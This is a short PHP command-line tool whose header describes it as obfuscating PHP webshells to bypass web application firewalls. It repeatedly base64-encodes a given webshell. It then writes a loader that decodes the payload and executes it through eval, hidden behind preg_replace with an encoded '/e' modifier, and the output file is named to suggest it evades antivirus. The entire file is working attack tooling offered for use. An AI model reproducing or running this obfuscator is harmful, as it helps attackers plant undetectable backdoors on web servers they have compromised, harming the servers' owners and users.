<?php
	/*
	 * Author: Laterain
	 * Time: 20130820
	 * About: Confusion to encrypt php webshell, Bypass the WAF
	 */
	 
	if ($argc < 4) {
		echo " ____ \r\n";                           
		echo "| __ ) _   _ _ __   __ _ ___ ___ \r\n";
		echo "|  _ \| | | | '_ \ / _` / __/ __|\r\n";
		echo "| |_) | |_| | |_) | (_| \__ \__ \\\r\n";
		echo "|____/ \__, | .__/ \__,_|___/___/\r\n";
        echo "       |___/|_| \r\n\r\n";
		echo "#usage: php $argv[0] webshell EncodeTimes outputfile\r\n";
		echo "#E x p: php $argv[0] phpspy.php 1 nokill.php\r\n";
		echo "#T i p: More EncodeTimes less speed!\r\n";
		exit;
	}
	
	if ($argv[2] < 1) {
		echo "Must >= 1 !\r\n";
		exit;
	}
	$source = $argv[1];
	$output = $argv[3];
	$source = php_strip_whitespace($source);
	$source = trim(trim(trim($source, '<?php'),'<?'),'?>');
	
	$shellcode = '$code';
	for ($i = 0; $i < $argv[2]; ++$i) {
		$source = base64_encode($source);
		$shellcode = 'base64_decode('.$shellcode.')';
	}
	
	$shellcode = 'preg_replace(base64_decode(\'L2EvZQ==\'),base64_decode(\''.base64_encode('eval('.$shellcode.')').'\'),\'a\')';
	$shellcode = '<?php $code=\''.$source.'\';'."\r\n\r\n".$shellcode.'; ?>';
	
	fwrite(fopen($output, 'w'), $shellcode);
	echo "\r\nSuccess!\r\n"
?>
